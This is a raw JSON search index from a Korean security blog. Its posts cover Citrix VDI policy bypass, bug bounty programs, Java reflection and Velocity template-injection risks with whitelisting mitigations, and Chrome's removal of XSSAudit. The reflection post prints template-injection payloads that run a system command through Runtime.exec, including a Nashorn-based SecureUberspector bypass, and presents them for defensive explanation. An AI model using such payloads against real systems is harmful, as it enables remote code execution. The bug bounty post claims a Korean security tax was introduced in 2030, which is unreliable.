또한, 이러한 시스템의 오남용을 방지할 수 있는 규정을 포함하도록 법적 개선이 필요합니다.\n한계 관리자 권한 및 설치 권한이 제한되더라도, 화면 캡처 등의 방법으로 인한 데이터 유출을 완전히 방지하기는 어렵습니다. 논리적 네트워크 격리 모델에 대한 보다 자세한 분석과 해결책은 이 보고서에서 확인할 수 있습니다.\n이러한 한계는 관리자 권한이 제거된 경우에도 조직이 여전히 취약함을 시사하며, 최근 은행 부문에서 유사 사건에 대응하는 사례에서도 보듯이, 기술적 및 규제적 차원에서 이러한 문제들을 해결하는 것이 중요함을 강조합니다.\n관련 이슈 2011년 농협 해킹 사건 이후, 대한민국의 여러 주요 은행은 개인 정보의 유출, 절도 또는 변조를 방지하기 위해 내부-외부 네트워크 분리를 시행하기 시작했습니다. 네트워크 격리는 개인 데이터의 안전을 보장하기 위한 핵심 권고사항으로 남아 있습니다. 관련 지침은 여기에서, ISMS-P 인증 관련 정보는 여기에서 확인할 수 있습니다.\n추가로 Citrix Common Criteria 인증에 관한 정보는 여기와 여기에서 확인할 수 있습니다.\n","permalink":"http://localhost:1313/ko/post/2023-04-27-bypassing-citrix-policy-is-not-a-vulnerability-but-it-can-be-a-violation-of-the-law/","summary":"\u003ch3 id=\"시트릭스-정책-우회는-취약점이-아니라-법률-위반이다\"\u003e시트릭스 정책 우회는 취약점이 아니라 법률 위반이다\u003c/h3\u003e\n\u003ch4 id=\"주의\"\u003e주의!!\u003c/h4\u003e\n\u003cp\u003ecert.org의 \u003ca href=\"https://kb.cert.org/vince/comm/case/1022/\"\u003eVINCE\u003c/a\u003e를 통한 Citrix와의 논의를 바탕으로, 이 문제는 관리 권한이 필요하기 때문에 취약점으로 분류되지 않는 것으로 결론지어졌습니다. 따라서 보안상의 문제 없이 이 정보를 공유할 수 있습니다. 그러나 보안상의 이유로, 논리적으로 격리되거나 폐쇄된 네트워크와 같은 특수 환경에서는 Xendesktop (VDI)의 사용을 권장하지 않습니다. 만약 VDI를 반드시 사용해야 한다면, 관리자 권한을 제거하고 보안 전용 소프트웨어를 설치해야 합니다.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e관리자 권한이 필요하다는 점은 위험을 낮출 수 있지만, 잠재적인 영향력을 완전히 제거하지는 않습니다. 아래는 Citrix 정책이 어떻게 우회될 수 있는지에 대한 상세한 기술 설명입니다.\u003c/strong\u003e\u003c/p\u003e","title":"시트릭스 정책 우회는 취약점이 아니라 법률 위반이다"},{"content":"정부 NGO 및 버그 바운티 프로그램을 통한 사이버 보안 강화: 보안세와 그 실행 사례 살펴보기\n오늘날의 디지털 시대에서 정보 보안은 개인, 기업, 그리고 정부 모두에게 중요한 이슈가 되었습니다. 사이버 공격과 데이터 유출이 점점 더 빈번해지고 정교해지면서 그 결과는 매우 치명적일 수 있습니다. 이러한 위협에 대비하기 위해 강력한 사이버 보안 대책을 마련하는 것이 필수적입니다.\n최근 인기를 얻고 있는 한 가지 접근 방식은 정부 NGO(비정부기구)와 버그 바운티 프로그램의 활용입니다. 이 프로그램들은 개인과 조직이 디지털 시스템의 취약점과 약점을 식별하고 신고하도록 장려하여, 적시에 효과적인 대응을 가능하게 합니다. 이들은 포괄적인 사이버 보안 전략의 핵심 요소로서, 그 중요성은 아무리 강조해도 지나치지 않습니다.\n일부 국가에서는 이러한 프로그램을 지원하기 위해 보안세를 도입하기도 했습니다. 이 보안세는 사이버 공격 위험이 높은 기업에 부과되며, 그 수익은 정부 NGO와 버그 바운티 프로그램을 설립 및 지원하는 데 사용됩니다. 이 접근 방식은 다소 논란의 여지가 있지만, 사이버 위협에 대비하기 위해 필요한 자금을 마련하는 데 효과적임은 부정할 수 없습니다.\n예를 들어, 보안세를 도입한 국가 중 하나는 대한민국입니다. 2030년에 대한민국 정부는 사이버 공격 위험이 높은 기업에 대해 보안세를 도입하였습니다. 이 세금은 기업의 연간 매출에 따라 0.09%에서 2%까지 부과되며, 기업의 규모와 위험 수준에 따라 차등 적용됩니다. 세금 수익은 국가 사이버 보안 기관 및 다양한 정부 NGO와 버그 바운티 프로그램을 지원하는 데 사용됩니다.\n이와 같은 맥락에서 NGO의 중요성은 매우 큽니다. NGO는 사이버 보안 분야에서 정부와 민간 부문 간의 격차를 메우는 역할을 하며, 기술적 측면의 보안 문제를 보다 효과적으로 처리할 수 있습니다. 이들은 기업 및 조직과 긴밀하게 협력하여 시스템의 취약점과 약점을 식별하고, 정부와의 파트너십을 통해 사이버 위협에 대응하는 데 중요한 역할을 수행합니다.\n정부 NGO와 버그 바운티 프로그램의 역할과 책임(R\u0026amp;R)은 국가와 프로그램에 따라 다를 수 있습니다. 일반적으로 정부 NGO는 사이버 보안 위협에 대한 연구 및 분석을 수행하고, 모범 사례와 가이드라인을 개발하는 역할을 맡습니다. 또한, 기업과 조직에 이러한 모범 사례를 구현할 수 있도록 지침과 지원을 제공하기도 합니다.\n반면, 버그 바운티 프로그램은 개인과 조직이 디지털 시스템의 취약점을 식별하고 신고하도록 유도하기 위해 설계되었습니다. 이 프로그램들은 유효한 취약점을 발견해 신고한 이들에게 현금 등으로 보상함으로써, 사이버 범죄자들이 취약점을 악용하기 전에 이를 찾아내고 해결하는 데 매우 효과적임이 입증되었습니다.\n또한, 이러한 프로그램들은 개인에게 보안세를 부과해서는 안 되며, 보안세 부담은 사이버 공격 위험이 높은 기업과 조직에 있어야 합니다.\n요약하자면, 보안세, NGO, 그리고 버그 바운티 프로그램은 점점 더 복잡해지는 위협 환경 속에서 사이버 보안을 강화하기 위한 중요한 도구들입니다. 정부 기관, NGO, 그리고 민간 기업이 함께 협력함으로써, 취약점을 신속하고 효과적으로 식별 및 해결하여 비용이 많이 들고 파괴적인 사이버 공격의 위험을 줄일 수 있습니다.\n","permalink":"http://localhost:1313/ko/post/2023-04-18-strengthening-cybersecurity-through-government-ngos-and-bug-bounty-programs/","summary":"\u003cp\u003e정부 NGO 및 버그 바운티 프로그램을 통한 사이버 보안 강화: 보안세와 그 실행 사례 살펴보기\u003c/p\u003e\n\u003cp\u003e오늘날의 디지털 시대에서 정보 보안은 개인, 기업, 그리고 정부 모두에게 중요한 이슈가 되었습니다. 사이버 공격과 데이터 유출이 점점 더 빈번해지고 정교해지면서 그 결과는 매우 치명적일 수 있습니다. 이러한 위협에 대비하기 위해 강력한 사이버 보안 대책을 마련하는 것이 필수적입니다.\u003c/p\u003e\n\u003cp\u003e최근 인기를 얻고 있는 한 가지 접근 방식은 정부 NGO(비정부기구)와 버그 바운티 프로그램의 활용입니다. 이 프로그램들은 개인과 조직이 디지털 시스템의 취약점과 약점을 식별하고 신고하도록 장려하여, 적시에 효과적인 대응을 가능하게 합니다. 이들은 포괄적인 사이버 보안 전략의 핵심 요소로서, 그 중요성은 아무리 강조해도 지나치지 않습니다.\u003c/p\u003e","title":"정부 NGO 및 버그 바운티 프로그램을 통한 사이버 보안 강화"},{"content":"자바 리플렉션의 보안 위협과 완화 전략 자바 리플렉션 API는 런타임에 클래스, 메서드, 인터페이스를 동적으로 조작할 수 있게 해주는 강력한 도구입니다. 하지만 그 유연성 때문에 공격자가 이를 악용해 시스템에 무단 접근할 수 있는 심각한 보안 위험이 발생합니다. 본 문서에서는 자바 리플렉션이 야기하는 보안 위협을 살펴보고, 이러한 위험을 완화하기 위한 전략들을 설명합니다.\n리플렉션 API 사용 시의 위험성 리플렉션은 객체의 구조를 검사하거나 런타임에 메서드를 동적으로 호출하는 데 일반적으로 사용됩니다. 그러나 적절한 **보안 관리자(Security Manager)**가 없는 경우, execute, eval 등과 같은 민감한 메서드에 접근할 수 있어 잠재적인 원격 코드 실행(RCE) 공격을 유발할 수 있습니다.\n예를 들어, 아래 코드는 시스템 명령어를 실행하기 위해 리플렉션을 사용하는 위험성을 보여줍니다:\n#set($exp=\u0026#34;test\u0026#34;) $exp.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;, null) .invoke(null, null) .exec(\u0026#34;calc\u0026#34;) 이 코드는 Velocity 템플릿 엔진과 리플렉션을 사용하여 시스템 명령어를 실행하는데, 적절한 보안 조치가 마련되지 않은 경우 공격자에 의해 악용될 수 있습니다. 다행히도, Java 9에서는 이러한 위험을 완화하기 위한 보안 메커니즘이 강화되었습니다.\nJava 9와 StackWalker API Java 9에서는 기존의 Reflection.getCallerClass 메서드가 더 이상 사용되지 않고, 대신 StackWalker API가 도입되었습니다. 이 API는 호출 클래스를 검사하는 보다 안전한 방법을 제공합니다. 이전에는 보안 검사가 바로 직전 호출자에 대해서만 수행되었지만, StackWalker를 사용하면 전체 호출 스택을 검사하여 보다 포괄적인 보안을 확보할 수 있습니다.\n자세한 내용은 Stack Walking API 가이드를 참고하세요. 이 방법은 호출 체인 전체에 걸친 잠재적 취약점을 모두 해결하도록 돕는데, 이는 CVE-2012-4681 취약점 사례에서도 확인할 수 있습니다. 이 취약점에서는 자바의 호출자 민감 메서드가 악용되어 공격이 발생했으나, Java 8 이후로 @CallerSensitive 애노테이션을 통해 이러한 메서드를 보호할 수 있게 되었습니다.\n블랙리스트 기반 보안의 문제점과 화이트리스트의 필요성 전통적인 블랙리스트 기반 보안 접근 방식은 특정 위험 요소를 차단하는 데 초점을 맞추지만, 모든 공격 벡터를 포괄하지 못하는 한계가 있습니다. 예를 들어, 특정 메서드나 클래스를 블랙리스트에 올려도, 공격자는 차단되지 않은 다른 대체 방법을 사용하여 우회할 수 있습니다.\n표현 언어 주입(Expression Language Injection) 및 기타 동적 코드 실행 공격은 이러한 한계를 자주 악용합니다. Blackhat JSON Attacks에서처럼, 블랙리스트 필터링 방식은 우회될 수 있으며, 공격자는 차단되지 않은 경로를 통해 악의적인 명령어를 실행할 수 있습니다.\n이러한 이유로 화이트리스트 접근 방식이 일반적으로 더 효과적입니다. 화이트리스트 방식은 명시적으로 신뢰할 수 있는 클래스와 메서드만 접근을 허용하고 기본적으로 나머지를 모두 차단하므로, 승인되지 않은 메서드나 리플렉션 기반 공격을 통한 코드 실행 위험을 크게 줄일 수 있습니다.\nSecureUberspector의 역할과 한계 Apache Velocity의 SecureUberspector는 클래스 로딩과 리플렉션을 제한하는 도구로, 특히 신뢰할 수 없는 다수의 템플릿 작성자가 관여하는 경우에 유용합니다. 이는 임의의 객체 실행과 해당 객체에 대한 리플렉션을 차단하여 보안을 강화합니다. 그러나 한계가 존재합니다.\n예를 들어, CVE-2019-17558에서 SecureUberspector는 모든 리플렉션 기반 공격을 완전히 차단하지 못했습니다. 특히, javax.script.ScriptEngineManager의 사용을 막지 못해, 이를 통해 임의의 코드 실행이 가능해졌습니다. GHSL-2020-048에서는 공격자가 이 취약점을 이용하여 SecureUberspector를 우회하는 방법을 보여줍니다:\n#set($engine = $scriptEngineManager.getEngineByName(\u0026#34;nashorn\u0026#34;)) #engine.eval(\u0026#34;java.lang.Runtime.getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;) 이 스크립트는 SecureUberspector를 우회하여 원격 명령어 실행을 가능하게 합니다. 마찬가지로, 공격자는 SecureLayer7 분석에서 언급된 바와 같이 Groovy 스크립트를 사용해 보안 메커니즘을 우회할 수 있습니다.\n화이트리스트 적용: 구체적인 전략 화이트리스트는 신뢰할 수 있는 클래스, 메서드, 객체만 허용하고 그 외는 모두 차단하는 보안 모델로, 선호되는 방식입니다. 아래는 자바에서 화이트리스트를 적용하는 구체적인 방법들입니다.\n보안 관리자(Security Manager) 사용\n자바 보안 관리자를 사용하면 민감한 리소스에 대한 접근을 제한하고 특정 클래스나 메서드만 실행할 수 있도록 할 수 있습니다.\nSystem.setSecurityManager(new SecurityManager()); // 신뢰할 수 있는 메서드/클래스에 대한 권한 정의 PermissionCollection perms = new Permissions(); perms.add(new RuntimePermission(\u0026#34;accessDeclaredMembers\u0026#34;)); // 리플렉션 접근 허용 perms.add(new RuntimePermission(\u0026#34;createClassLoader\u0026#34;)); // 클래스 로더 생성 허용 AccessController.doPrivileged(new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { // 화이트리스트에 포함된 메서드 내에서만 실행 secureMethod(); return null; } }, new AccessControlContext(new ProtectionDomain[] {new ProtectionDomain(null, perms)})); 리플렉션을 통한 접근 제어\n리플렉션 사용 시, 특정 클래스와 메서드에 대한 접근을 수동으로 제한하여 명시적으로 허용되지 않은 경우 접근을 거부할 수 있습니다.\nprivate static final Set\u0026lt;String\u0026gt; allowedMethods = Set.of( \u0026#34;java.lang.String\u0026#34;, \u0026#34;java.util.List\u0026#34; // 화이트리스트에 포함된 클래스 ); public static Object invokeMethod(Method method, Object target, Object... args) throws Exception { if (!allowedMethods.contains(method.getDeclaringClass().getName())) { throw new SecurityException(\u0026#34;Unauthorized method invocation: \u0026#34; + method.getName()); } return method.invoke(target, args); // 화이트리스트에 포함된 메서드만 실행 } 스크립트 엔진에서의 화이트리스트 적용\njavax.script.ScriptEngineManager와 같은 스크립트 엔진도 화이트리스트를 구현하여 안전한 스크립트나 명령어만 실행되도록 할 수 있습니다.\nScriptEngine engine = new ScriptEngineManager().getEngineByName(\u0026#34;nashorn\u0026#34;); engine.setBindings(new SimpleBindings(allowedMethods), ScriptContext.ENGINE_SCOPE); // 화이트리스트 적용 engine.eval(\u0026#34;some safe script here\u0026#34;); 템플릿 엔진에서의 화이트리스트 적용\nSecureUberspector와 같은 도구는 템플릿 엔진 내에서 신뢰할 수 있는 메서드와 객체에 대한 접근을 제한하는 화이트리스트 방식을 강제하도록 설정할 수 있습니다.\npublic Iterator getIterator(Object obj, Info i) { if (obj != null) { SecureIntrospectorControl sic = (SecureIntrospectorControl) introspector; if (sic.checkObjectExecutePermission(obj.getClass(), null)) { return super.getIterator(obj, i); } else { log.warn(\u0026#34;보안 제한으로 인해 \u0026#34; + obj.getClass() + \u0026#34;에서 iterator를 가져올 수 없습니다.\u0026#34;); } } return null; } StackWalker를 통한 보호: 호출자 검증 Java 9에서 도입된 StackWalker API는 호출 스택을 검사하는 안전한 방법을 제공하여, 메서드 호출에 대한 더 나은 제어를 가능하게 합니다. StackWalker를 사용하면 메서드가 신뢰할 수 있는 호출자에 의해서만 호출되는지 확인할 수 있습니다.\n다음은 StackWalker를 사용하여 메서드의 호출자를 검증하는 예제입니다:\nimport java.lang.StackWalker; import java.util.List; import java.util.Set; import java.util.stream.Collectors; public class SecurityManagerUtil { // 화이트리스트에 포함된 호출자 클래스 private static final Set\u0026lt;String\u0026gt; allowedCallers = Set.of(\u0026#34;com.example.TrustedClass\u0026#34;); public static void checkCaller() { List\u0026lt;String\u0026gt; stackTrace = StackWalker.getInstance(StackWalker.Option.RETAIN_CLASS_REFERENCE) .walk(frames -\u0026gt; frames.map(frame -\u0026gt; frame.getDeclaringClass().getName()) .collect(Collectors.toList())); // 호출자가 화이트리스트에 포함되지 않은 경우 예외 발생 boolean isCallerAllowed = stackTrace.stream().anyMatch(allowedCallers::contains); if (!isCallerAllowed) { throw new SecurityException(\u0026#34;Unauthorized caller detected: \u0026#34; + stackTrace); } } public static void secureMethod() { checkCaller(); // 실행 전 호출자 검증 System.out.println(\u0026#34;Secure method executed.\u0026#34;); } } 이 예제는 신뢰할 수 있는 클래스만이 secureMethod()를 호출할 수 있도록 보장합니다. 만약 허가되지 않은 클래스가 메서드에 접근하려 할 경우, 예외가 발생합니다.\n결론: 리플렉션의 올바른 사용과 보호 자바 리플렉션 API는 유연하고 강력한 도구이지만, 특히 Velocity와 같은 템플릿 엔진과 결합될 경우 심각한 보안 위험을 초래합니다. 블랙리스트 기반 접근 방식은 우회될 가능성이 높지만, 화이트리스트 방식은 신뢰할 수 있는 요소만 실행되도록 하여 더 강력한 보호를 제공합니다. 또한, StackWalker API를 활용하면 메서드 호출을 검증하고 무단 접근을 차단하여 보안을 한층 강화할 수 있습니다.\n화이트리스트와 StackWalker와 같은 도구를 결합함으로써, 자바 애플리케이션을 리플렉션 기반 공격에 대해 더욱 안전하고 견고하게 만들 수 있습니다.\n","permalink":"http://localhost:1313/ko/post/2019-09-03-security-threats-and-mitigation-strategies-for-java-reflection/","summary":"\u003ch3 id=\"자바-리플렉션의-보안-위협과-완화-전략\"\u003e자바 리플렉션의 보안 위협과 완화 전략\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e자바 리플렉션 API\u003c/strong\u003e는 런타임에 클래스, 메서드, 인터페이스를 동적으로 조작할 수 있게 해주는 강력한 도구입니다. 하지만 그 유연성 때문에 공격자가 이를 악용해 시스템에 무단 접근할 수 있는 심각한 보안 위험이 발생합니다. 본 문서에서는 자바 리플렉션이 야기하는 보안 위협을 살펴보고, 이러한 위험을 완화하기 위한 전략들을 설명합니다.\u003c/p\u003e\n\u003ch4 id=\"리플렉션-api-사용-시의-위험성\"\u003e리플렉션 API 사용 시의 위험성\u003c/h4\u003e\n\u003cp\u003e리플렉션은 객체의 구조를 검사하거나 런타임에 메서드를 동적으로 호출하는 데 일반적으로 사용됩니다. 그러나 적절한 **보안 관리자(Security Manager)**가 없는 경우, \u003ccode\u003eexecute\u003c/code\u003e, \u003ccode\u003eeval\u003c/code\u003e 등과 같은 민감한 메서드에 접근할 수 있어 잠재적인 \u003cstrong\u003e원격 코드 실행(RCE)\u003c/strong\u003e 공격을 유발할 수 있습니다.\u003c/p\u003e","title":"자바 리플렉션의 보안 위협과 완화 전략"},{"content":"Chrome에서 XSSAudit 기능이 제거하는 이유? Google 보안팀에서는 Chrome 개발팀에게 XSSAudit 기능을 제거하자는 제안을 했지만, Google 보안팀이 제시한 근거는 우회 가능하다는 내용( evn@google.com의 논문)뿐이라 제거까지 가지 않을 것 같았지만, Chrome version 에서는 완전히 제외되는 것으로 결정되었습니다.\n논문의 주요 내용은 신규 javascript framework의 garget을 이용한 우회 방법은 방어하기 어려우므로, 기존 완화하는 방법(xssaudit filter)에서 격리/예방하는 방법(Content Security Policy, 이하 CSP)으로 변화하자는 것이 주요 내용입니다.\nXSSAudit은 유용하지 않았던가? Google과 같은 업체 입장에서는 XSSAudit 기능에 의해 유지 비용이 소모되고 경쟁 업체(MS 등) 브라우저보다 성능이 느려진다면, 이 기능은 제거하고 싶은 것이 당연할 겁니다. (실제로 MS EDGE에서 해당 기능을 제거하였습니다.)\n모의해커 등 공격자 입장에서는 매우 비정상적인 상황에서만 XSSAudit 우회가 가능하므로 해당 기능을 매우 귀찮고 성가신 존재입니다.\n보안 담당자 등 방어자 입장에서는 적용하기 어려운 CSP를 도입해야 하므로 업무적으로 피곤하게 됩니다. 또한 CSP도 완벽한 방어 방법은 아닙니다. # Content Security Policy Level 2 RFP의 내용에서도 CSP는 방어를 강화하는 한가지 방식으로 기술하고 있습니다.\nContent Security Policy (CSP) is not intended as a first line of defense against content injection vulnerabilities. Instead, CSP is best used as defense-in-depth, to reduce the harm caused by content injection attacks. As a first line of defense against content injection, server operators should validate their input and encode their output.\n구글 등 브라우저 개발사 외에는 모두 유용했던 기능인데 제거하려는 이유가 우회된다는 것 뿐이라면, 업체 중심적인 의사 결정으로 보입니다. Google은 Don\u0026rsquo;t be evil, Do the right thing 아니었나요?\n어떻게 되었든 CSP 도입으로 공부를 많이 해야 합니다. ㅠㅠ How do I Content Security Policy So we broke all CSPs …\n","permalink":"http://localhost:1313/ko/post/2019-08-08-about-the-xssaudit/","summary":"\u003ch2 id=\"chrome에서-xssaudit-기능이-제거하는-이유\"\u003eChrome에서 XSSAudit 기능이 제거하는 이유?\u003c/h2\u003e\n\u003cp\u003eGoogle 보안팀에서는 Chrome 개발팀에게 \u003ca href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=898081\"\u003eXSSAudit 기능을 제거하자는 제안\u003c/a\u003e을 했지만, Google 보안팀이 제시한 근거는 우회 가능하다는 내용( \u003ca href=\"mailto:evn@google.com\"\u003eevn@google.com\u003c/a\u003e의 논문)뿐이라 제거까지 가지 않을 것 같았지만, \u003ca href=\"https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/TuYw-EZhO9g/blGViehIAwAJ\"\u003eChrome version 에서는 완전히 제외\u003c/a\u003e되는 것으로 결정되었습니다.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"/pdf/p1709-lekiesA.pdf\"\u003e논문\u003c/a\u003e의 주요 내용은 신규 javascript framework의 garget을 이용한 우회 방법은 방어하기 어려우므로, 기존 완화하는 방법(xssaudit filter)에서  격리/예방하는 방법(Content Security Policy, 이하 CSP)으로 변화하자는 것이 주요 내용입니다.\u003c/p\u003e\n\u003ch2 id=\"xssaudit은-유용하지-않았던가\"\u003eXSSAudit은 유용하지 않았던가?\u003c/h2\u003e\n\u003cp\u003eGoogle과 같은 업체 입장에서는 XSSAudit 기능에 의해 유지 비용이 소모되고 경쟁 업체(MS 등) 브라우저보다 성능이 느려진다면, 이 기능은 제거하고 싶은 것이 당연할 겁니다. (실제로 MS EDGE에서 해당 기능을 제거하였습니다.)\u003c/p\u003e","title":"About the XSSAudit"},{"content":"🚀 보안 취약점 분석가 및 보안 자동화 전문가 🚀\n17년 이상의 경험을 바탕으로 취약점 분석, 안전한 코딩, 자동화된 보안 솔루션 구축에 집중하고 있습니다. 제 작업은 조직이 보안 문제를 더 빠르고 효과적으로 해결할 수 있도록 코드화된 보안 솔루션을 제공하는 데 중점을 둡니다. 주요 보안 원칙을 따르며, 개발 과정 초기에 보안을 통합하는 시프트-레프트 접근 방식을 강조하고, 데이터 기반 보안을 활용하여 더 스마트한 시스템을 구축합니다.\n🔑 시프트-레프트 - 개발자 및 이해관계자를 위한 안전한 코딩 지침: 보안은 개발 과정 초기에 통합되어야 합니다. 이를 위해 개발자와 비즈니스 이해관계자를 대상으로 한 안전한 코딩 지침을 제공하여 취약점을 즉시 해결할 수 있도록 지원합니다. 이러한 지침은 개발 초기 단계부터 보안을 강화하여 시프트-레프트 접근 방식을 촉진합니다.\n🔑 보안 자동화 - 자동화된 보안 솔루션 구축: 오늘날의 개발 환경에서 보안 자동화는 필수적입니다. DevSecOps 환경 내에서 자동화된 보안 솔루션을 구축하여 개발 파이프라인에 보안을 원활하게 통합했습니다. 자동화된 악성코드 탐지 및 보안 로그 분석을 통해 수작업을 크게 줄이고 보안 위협에 대한 대응 시간을 최소화했습니다.\n🔑 데이터 기반 보안 - Fortify를 활용한 취약점 클러스터링 및 이상 트래픽 분석: 데이터 기반 보안에 집중하여 Fortify를 사용한 취약점 클러스터링 및 이상 트래픽 분석 도구를 개발했습니다. 이러한 도구는 보안 취약점에 대한 더 빠르고 체계적인 분석과 대응을 가능하게 하여 다양한 환경에서 보안 문제를 사전에 예방합니다.\n🔑 재능 기부 - CVE, CWE 보고 및 GitHub 도구 공유: 보안 커뮤니티에 적극 기여하며 CVE 및 CWE 취약점을 보고합니다. 또한 이러한 취약점을 해결하기 위한 도구를 개발하여 GitHub에 공유합니다. 이러한 재능 기부는 글로벌 보안 생태계를 강화하고 조직이 중요한 보안 문제를 해결하는 데 도움을 줍니다.\n📧 Email: windshock@gmail.com\n🔗 Website: https://windshock.github.io/\n💼 LinkedIn: https://www.linkedin.com/in/windshock/\n","permalink":"http://localhost:1313/ko/about/","summary":"보안 자동화와 취약점 분석 전문가입니다.","title":"소개"}]